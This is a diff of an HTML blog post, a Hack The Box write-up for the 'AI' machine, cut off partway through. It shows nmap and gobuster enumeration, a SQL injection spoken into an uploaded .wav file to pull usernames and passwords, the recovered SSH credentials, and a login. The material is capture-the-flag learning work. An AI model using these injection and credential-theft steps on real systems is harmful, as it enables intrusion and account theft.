@@ -1,324 +1,165 @@
-<!doctype html><html lang=en>
-<head>
-<meta charset=utf-8>
-<meta http-equiv=x-ua-compatible content="ie=edge">
-<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
-<meta name=author content="ceso ">
-<meta name=description content="Quick Summary Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D. At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.
-This was a box where for the foothold, you needed to upload a .">
-<meta name=keywords content="CTF,Security,HTB,Blog,Infosec,htb-medium,linux,sqli,jwdp">
-<meta name=robots content="noodp">
-<meta name=theme-color content="#252627">
-<link rel=canonical href=https://ceso.github.io/posts/2020/02/hack-the-box-ai/>
-<title>
-Hack The Box - AI :: Ceso Adventures
-</title>
-<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css rel=stylesheet type=text/css>
-<link rel=stylesheet href=https://ceso.github.io/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css>
-<link rel=stylesheet type=text/css href=https://ceso.github.io/css/scroll.css>
-<link rel=apple-touch-icon sizes=180x180 href=https://ceso.github.io/apple-touch-icon.png>
-<link rel=icon type=image/png sizes=32x32 href=https://ceso.github.io/favicon-32x32.png>
-<link rel=icon type=image/png sizes=16x16 href=https://ceso.github.io/favicon-16x16.png>
-<link rel=manifest href=https://ceso.github.io/site.webmanifest>
-<link rel=mask-icon href=https://ceso.github.io/safari-pinned-tab.svg color=#252627>
-<link rel="shortcut icon" href=https://ceso.github.io/favicon.ico>
-<meta name=msapplication-TileColor content="#252627">
-<meta name=theme-color content="#252627">
-<meta itemprop=name content="Hack The Box - AI">
-<meta itemprop=description content="My write-up / walkthrough for AI from Hack The Box."><meta itemprop=datePublished content="2020-02-07T00:00:00+00:00">
-<meta itemprop=dateModified content="2020-02-07T00:00:00+00:00">
-<meta itemprop=wordCount content="1277"><meta itemprop=image content="https://ceso.github.io/images/htb/ai/ai-header.jpg">
-<meta itemprop=keywords content="htb-medium,linux,sqli,jwdp,">
-<meta name=twitter:card content="summary_large_image">
-<meta name=twitter:image content="https://ceso.github.io/images/htb/ai/ai-header.jpg">
-<meta name=twitter:title content="Hack The Box - AI">
-<meta name=twitter:description content="My write-up / walkthrough for AI from Hack The Box.">
-<meta property="article:published_time" content="2020-02-07 00:00:00 +0000 UTC">
-</head>
-<body class=dark-theme>
-<div class=container>
-<header class=header>
-<span class=header__inner>
-<a href=https://ceso.github.io/ style=text-decoration:none>
-<div class=logo>
-<span class=logo__mark>></span>
-<span class=logo__text>ceso@hogsmeade$ </span>
-<span class=logo__cursor style=background-color:gray>
-</span>
-</div>
-</a>
-<span class=header__right>
-<nav class=menu>
-<ul class=menu__inner><li><a href=https://ceso.github.io/about/>About</a></li><li><a href=https://ceso.github.io/posts/2020/04/hacking-cheatsheet/>Cheatsheet</a></li><li><a href=https://ceso.github.io/posts/>Posts</a></li><li><a href=https://ceso.github.io/posts/2020/12/hacking-resources/>Resources</a></li><li><a href=https://ceso.github.io/tags/>Tags</a></li><li><a href=https://ceso.github.io/posts/2021/03/my-videos/>Videos</a></li>
-</ul>
-</nav>
-<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
-</span>
-<span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
-</span>
-</span>
-</span>
-</header>
-<div class=content>
-<div class=post>
-<div class=post-info>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>6 minutes
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="ceso "><meta name=description content="Quick Summary Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D. At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.
+This was a box where for the foothold, you needed to upload a ."><meta name=keywords content="CTF,Security,HTB,Blog,Infosec,htb-medium,linux,sqli,jwdp"><meta name=robots content="noodp"><meta name=theme-color content="#252627"><link rel=canonical href=https://ceso.github.io/posts/2020/02/hack-the-box-ai/><title>Hack The Box - AI :: Ceso Adventures</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=https://ceso.github.io/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css><link rel=stylesheet type=text/css href=https://ceso.github.io/css/scroll.css><link rel=apple-touch-icon sizes=180x180 href=https://ceso.github.io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://ceso.github.io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://ceso.github.io/favicon-16x16.png><link rel=manifest href=https://ceso.github.io/site.webmanifest><link rel=mask-icon href=https://ceso.github.io/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=https://ceso.github.io/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="Hack The Box - AI"><meta itemprop=description content="My write-up / walkthrough for AI from Hack The Box."><meta itemprop=datePublished content="2020-02-07T00:00:00+00:00"><meta itemprop=dateModified content="2020-02-07T00:00:00+00:00"><meta itemprop=wordCount content="1277"><meta itemprop=image content="https://ceso.github.io/images/htb/ai/ai-header.jpg"><meta itemprop=keywords content="htb-medium,linux,sqli,jwdp,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://ceso.github.io/images/htb/ai/ai-header.jpg"><meta name=twitter:title content="Hack The Box - AI"><meta name=twitter:description content="My write-up / walkthrough for AI from Hack The Box."><meta property="article:published_time" content="2020-02-07 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=https://ceso.github.io/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>ceso@hogsmeade$</span>
+<span class=logo__cursor style=background-color:gray></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://ceso.github.io/about/>About</a></li><li><a href=https://ceso.github.io/posts/2020/04/hacking-cheatsheet/>Cheatsheet</a></li><li><a href=https://ceso.github.io/posts/>Posts</a></li><li><a href=https://ceso.github.io/posts/2020/12/hacking-resources/>Resources</a></li><li><a href=https://ceso.github.io/tags/>Tags</a></li><li><a href=https://ceso.github.io/posts/2021/03/my-videos/>Videos</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>6 minutes
 | Tambien disponible en
-<a href=https://ceso.github.io/es/posts/2020/02/hack-the-box-ai/><span class="flag flag-icon flag-icon-es flag-icon-squared"></span></a>
-</p>
-</div>
-<h2 class=post-title><a href=https://ceso.github.io/posts/2020/02/hack-the-box-ai/>Hack The Box - AI</a></h2>
-<div class=post-meta>
-<span class=post-date>
-2020-02-07
-</span>
-</div>
-<span class=post-tags>
-#<a href=https://ceso.github.io/tags/htb-medium/>htb-medium</a>&nbsp;
+<a href=https://ceso.github.io/es/posts/2020/02/hack-the-box-ai/><span class="flag flag-icon flag-icon-es flag-icon-squared"></span></a></p></div><h2 class=post-title><a href=https://ceso.github.io/posts/2020/02/hack-the-box-ai/>Hack The Box - AI</a></h2><div class=post-meta><span class=post-date>2020-02-07</span></div><span class=post-tags>#<a href=https://ceso.github.io/tags/htb-medium/>htb-medium</a>&nbsp;
 #<a href=https://ceso.github.io/tags/linux/>linux</a>&nbsp;
 #<a href=https://ceso.github.io/tags/sqli/>sqli</a>&nbsp;
-#<a href=https://ceso.github.io/tags/jwdp/>jwdp</a>&nbsp;
-</span>
-<div class=post-content><div id=TableOfContents>
-<ul>
-<li>
-<a href=#quick-summary>Quick Summary</a>
-</li><li>
-<a href=#nmap>Nmap</a>
-</li><li>
-<a href=#web-enumeration>Web enumeration</a>
-</li><li>
-<a href=#foothold>Foothold</a>
-</li><li>
-<a href=#privilege-escalation>Privilege escalation</a>
-</li></ul>
-</div>
-<img src=https://ceso.github.io/images/htb/ai/info-card.png class=center style=border-radius:8px>
-<h2 id=quick-summary>Quick Summary</h2>
-<p>Finally, I&rsquo;m posting the walk-through of this box, currently, I&rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D.
-At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.</p>
-<p>This was a box where for the foothold, you needed to upload a .wav file with a sql injection to get the reverse shell (the .wav is interpreted by an AI), and for the root you needed to exploit <a href=https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html>JWDP</a>, the idea of using an AI for the foothold, was original kudos for that, but the implementation of it, and the multiple tries-error with different <a href=https://en.wikipedia.org/wiki/Speech_synthesis>TTS</a> I didn&rsquo;t like it, in summary, was a box I didn&rsquo;t feel like learning something new at all.</p>
-<p>Said that, time to get our hands dirty.</p>
-<h2 id=nmap>Nmap</h2>
-<p>As always the enumeration starts by running Nmap:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console># Nmap 7.80 scan initiated Wed Dec <span style=color:#ae81ff>11</span> 15:33:30 <span style=color:#ae81ff>2019</span> as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
-Nmap scan report for ai.htb (10.10.10.163)
-Host is up (0.019s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
-|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
-|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Hello AI!
-No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-TCP/IP fingerprint:
-OS:SCAN(V=7.80%E=4%D=12/11%OT=22%CT=1%CU=38328%PV=Y%DS=2%DC=I%G=Y%TM=5DF152
-OS:AE%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SE
-OS:Q(SP=108%GCD=2%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%
-OS:O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2
-OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNS
-OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
-OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
-OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
-OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
-OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap <span style=color:#66d9ef>done</span> at Wed Dec <span style=color:#ae81ff>11</span> 15:33:50 <span style=color:#ae81ff>2019</span> -- <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 20.74 seconds
-</code></pre></div><p>Which discovers SSH and HTTP (Apache 2.4.29 as the server) open.</p>
-<h2 id=web-enumeration>Web enumeration</h2>
-<p>The home page just shows &ldquo;Artificial Intelligence&rdquo; and has some interactive menus, in one of them, is announced about an AI the company is developing, which can identify what&rsquo;s being told in it, so is possible to upload a file to server, this is already a way to go as is possible to upload a reverse shell.
-Some enumeration of it is carried.</p>
-<img src=https://ceso.github.io/images/htb/ai/1.1-web.png class=center style=border-radius:8px>
+#<a href=https://ceso.github.io/tags/jwdp/>jwdp</a>&nbsp;</span><div class=post-content><div id=TableOfContents><ul><li><a href=#quick-summary>Quick Summary</a></li><li><a href=#nmap>Nmap</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#privilege-escalation>Privilege escalation</a></li></ul></div><img src=https://ceso.github.io/images/htb/ai/info-card.png class=center style=border-radius:8px><h2 id=quick-summary>Quick Summary</h2><p>Finally, I&rsquo;m posting the walk-through of this box, currently, I&rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D.
+At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.</p><p>This was a box where for the foothold, you needed to upload a .wav file with a sql injection to get the reverse shell (the .wav is interpreted by an AI), and for the root you needed to exploit <a href=https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html>JWDP</a>, the idea of using an AI for the foothold, was original kudos for that, but the implementation of it, and the multiple tries-error with different <a href=https://en.wikipedia.org/wiki/Speech_synthesis>TTS</a> I didn&rsquo;t like it, in summary, was a box I didn&rsquo;t feel like learning something new at all.</p><p>Said that, time to get our hands dirty.</p><h2 id=nmap>Nmap</h2><p>As always the enumeration starts by running Nmap:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span># Nmap 7.80 scan initiated Wed Dec <span style=color:#ae81ff>11</span> 15:33:30 <span style=color:#ae81ff>2019</span> as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
+</span></span><span style=display:flex><span>Nmap scan report for ai.htb (10.10.10.163)
+</span></span><span style=display:flex><span>Host is up (0.019s latency).
+</span></span><span style=display:flex><span>Not shown: 998 closed ports
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
+</span></span><span style=display:flex><span>|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
+</span></span><span style=display:flex><span>|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
+</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span></span><span style=display:flex><span>|_http-title: Hello AI!
+</span></span><span style=display:flex><span>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span style=display:flex><span>TCP/IP fingerprint:
+</span></span><span style=display:flex><span>OS:SCAN(V=7.80%E=4%D=12/11%OT=22%CT=1%CU=38328%PV=Y%DS=2%DC=I%G=Y%TM=5DF152
+</span></span><span style=display:flex><span>OS:AE%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SE
+</span></span><span style=display:flex><span>OS:Q(SP=108%GCD=2%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%
+</span></span><span style=display:flex><span>OS:O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2
+</span></span><span style=display:flex><span>OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNS
+</span></span><span style=display:flex><span>OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
+</span></span><span style=display:flex><span>OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
+</span></span><span style=display:flex><span>OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
+</span></span><span style=display:flex><span>OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
+</span></span><span style=display:flex><span>OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Network Distance: 2 hops
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span># Nmap <span style=color:#66d9ef>done</span> at Wed Dec <span style=color:#ae81ff>11</span> 15:33:50 <span style=color:#ae81ff>2019</span> -- <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 20.74 seconds
+</span></span></code></pre></div><p>Which discovers SSH and HTTP (Apache 2.4.29 as the server) open.</p><h2 id=web-enumeration>Web enumeration</h2><p>The home page just shows &ldquo;Artificial Intelligence&rdquo; and has some interactive menus, in one of them, is announced about an AI the company is developing, which can identify what&rsquo;s being told in it, so is possible to upload a file to server, this is already a way to go as is possible to upload a reverse shell.
+Some enumeration of it is carried.</p><img src=https://ceso.github.io/images/htb/ai/1.1-web.png class=center style=border-radius:8px>
 <img src=https://ceso.github.io/images/htb/ai/1.1-web-php-1.png class=center style=border-radius:8px>
 <img src=https://ceso.github.io/images/htb/ai/1.1-web-php-2.png class=center style=border-radius:8px>
-<img src=https://ceso.github.io/images/htb/ai/1.1-web-php-3.png class=center style=border-radius:8px>
-<p>Is given a try to create a .wav file from text (text -> .mp3 -> .wav), upload it and see what happens, the result is an exception which gives a hint: there is access to a mysql database, which means will be possible to do an sql injection.</p>
-<img src=https://ceso.github.io/images/htb/ai/1.1-web-rce-1.png class=center style=border-radius:8px>
-<img src=https://ceso.github.io/images/htb/ai/1.1-web-rce-2.png class=center style=border-radius:8px>
-<h2 id=foothold>Foothold</h2>
-<p>A step to make an sql injection was carried in the same way than before for the RCE, which resulted in nothing, based on that gobuster was run against AI to see if there was some web page that could give hints in HOW to properly write the sql injection for it being interpreted by the AI.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.10.163
-[+] Threads:        10
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Extensions:     php
-[+] Timeout:        10s
-===============================================================
-2020/02/07 15:23:07 Starting gobuster
-===============================================================
-/images (Status: 301)
-/index.php (Status: 200)
-/contact.php (Status: 200)
-/about.php (Status: 200)
-/uploads (Status: 301)
-/db.php (Status: 200)
-/intelligence.php (Status: 200)
-/ai.php (Status: 200)
-===============================================================
-2020/02/07 15:48:32 Finished
-===============================================================
-</code></pre></div><p>As is possible to see above, <code>intelligence.php</code> was discovered, once that page is accessed, is found a guide on how to write some queries to the AI:</p>
-<img src=https://ceso.github.io/images/htb/ai/2.1-rce-2.png class=center style=border-radius:8px>
-<p>After a LOT of try-error (literally, I was never able to go beyond this if it wasn&rsquo;t for the help of <a href=https://www.hackthebox.eu/profile/10423>Interep</a> of both queries and different TTS (being I&rsquo;m not a native english speaker and neither I have a microphone), was used in the end <a href=https://www.text2speech.org/>Text 2 Speech</a>:</p>
-<img src=https://ceso.github.io/images/htb/ai/t2s.png class=center style=border-radius:8px>
-<p>getting as final SQL Injection the next:</p>
-<pre tabindex=0><code>User:
+<img src=https://ceso.github.io/images/htb/ai/1.1-web-php-3.png class=center style=border-radius:8px><p>Is given a try to create a .wav file from text (text -> .mp3 -> .wav), upload it and see what happens, the result is an exception which gives a hint: there is access to a mysql database, which means will be possible to do an sql injection.</p><img src=https://ceso.github.io/images/htb/ai/1.1-web-rce-1.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/ai/1.1-web-rce-2.png class=center style=border-radius:8px><h2 id=foothold>Foothold</h2><p>A step to make an sql injection was carried in the same way than before for the RCE, which resulted in nothing, based on that gobuster was run against AI to see if there was some web page that could give hints in HOW to properly write the sql injection for it being interpreted by the AI.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
+</span></span><span style=display:flex><span>===============================================================
+</span></span><span style=display:flex><span>Gobuster v3.0.1
+</span></span><span style=display:flex><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+</span></span><span style=display:flex><span>===============================================================
+</span></span><span style=display:flex><span>[+] Url:            http://10.10.10.163
+</span></span><span style=display:flex><span>[+] Threads:        10
+</span></span><span style=display:flex><span>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+</span></span><span style=display:flex><span>[+] Status codes:   200,204,301,302,307,401,403
+</span></span><span style=display:flex><span>[+] User Agent:     gobuster/3.0.1
+</span></span><span style=display:flex><span>[+] Extensions:     php
+</span></span><span style=display:flex><span>[+] Timeout:        10s
+</span></span><span style=display:flex><span>===============================================================
+</span></span><span style=display:flex><span>2020/02/07 15:23:07 Starting gobuster
+</span></span><span style=display:flex><span>===============================================================
+</span></span><span style=display:flex><span>/images (Status: 301)
+</span></span><span style=display:flex><span>/index.php (Status: 200)
+</span></span><span style=display:flex><span>/contact.php (Status: 200)
+</span></span><span style=display:flex><span>/about.php (Status: 200)
+</span></span><span style=display:flex><span>/uploads (Status: 301)
+</span></span><span style=display:flex><span>/db.php (Status: 200)
+</span></span><span style=display:flex><span>/intelligence.php (Status: 200)
+</span></span><span style=display:flex><span>/ai.php (Status: 200)
+</span></span><span style=display:flex><span>===============================================================
+</span></span><span style=display:flex><span>2020/02/07 15:48:32 Finished
+</span></span><span style=display:flex><span>===============================================================
+</span></span></code></pre></div><p>As is possible to see above, <code>intelligence.php</code> was discovered, once that page is accessed, is found a guide on how to write some queries to the AI:</p><img src=https://ceso.github.io/images/htb/ai/2.1-rce-2.png class=center style=border-radius:8px><p>After a LOT of try-error (literally, I was never able to go beyond this if it wasn&rsquo;t for the help of <a href=https://www.hackthebox.eu/profile/10423>Interep</a> of both queries and different TTS (being I&rsquo;m not a native english speaker and neither I have a microphone), was used in the end <a href=https://www.text2speech.org/>Text 2 Speech</a>:</p><img src=https://ceso.github.io/images/htb/ai/t2s.png class=center style=border-radius:8px><p>getting as final SQL Injection the next:</p><pre tabindex=0><code>User:
 Open single quote union select, username from users Comment Database
 Password:
 Open single quote union select, password from users Comment Database
-</code></pre><p>Once it&rsquo;s respective .wav files generate by the TTS mentioned above were uploaded, the following were the results:</p>
-<img src=https://ceso.github.io/images/htb/ai/command-ok-1.png class=center style=border-radius:8px>
-<img src=https://ceso.github.io/images/htb/ai/command-ok-2.png class=center style=border-radius:8px>
-<p>Then, was tried to login via ssh with the credentials:</p>
-<pre tabindex=0><code>user: alexa
+</code></pre><p>Once it&rsquo;s respective .wav files generate by the TTS mentioned above were uploaded, the following were the results:</p><img src=https://ceso.github.io/images/htb/ai/command-ok-1.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/ai/command-ok-2.png class=center style=border-radius:8px><p>Then, was tried to login via ssh with the credentials:</p><pre tabindex=0><code>user: alexa
 passwd: H,Sq9t6}a&lt;)?q93_
-</code></pre><p>Getting a success:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
-alexa@10.10.10.163&#39;s password: 
-Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span> * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>  System information as of Fri Feb  7 20:27:47 UTC 2020
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>  System load:  0.14               Processes:           162
-  Usage of /:   28.0% of 19.56GB   Users logged in:     1
-  Memory usage: 27%                IP address for eth0: 10.10.10.163
-  Swap usage:   0%
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span> * Canonical Livepatch is available for installation.
-   - Reduce system reboots and improve kernel security. Activate at:
-     https://ubuntu.com/livepatch
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>63 packages can be updated.
-15 updates are security updates.
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>Last login: Fri Feb  7 20:14:41 2020 from 10.10.14.29
-alexa@AI:~$ wc -c user.txt
-33 user.txt
-</code></pre></div><h2 id=privilege-escalation>Privilege escalation</h2>
-<p>When is checked which net. services are listening, was found :8080:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>alexa@AI:~$ ss -punta
-Netid               State                    Recv-Q                Send-Q                                       Local Address:Port                                        Peer Address
-:Port                 
-udp                 UNCONN                   0                     0                                            127.0.0.53%lo:53                                               0.0.0.0
-:*                    
-udp                 UNCONN                   0                     0                                                  0.0.0.0:5353                                             0.0.0.0
-:*                    
-udp                 UNCONN                   0                     0                                                  0.0.0.0:53210                                            0.0.0.0
-:*                    
-udp                 UNCONN                   0                     0                                                     [::]:5353                                                [::]
-:*                    
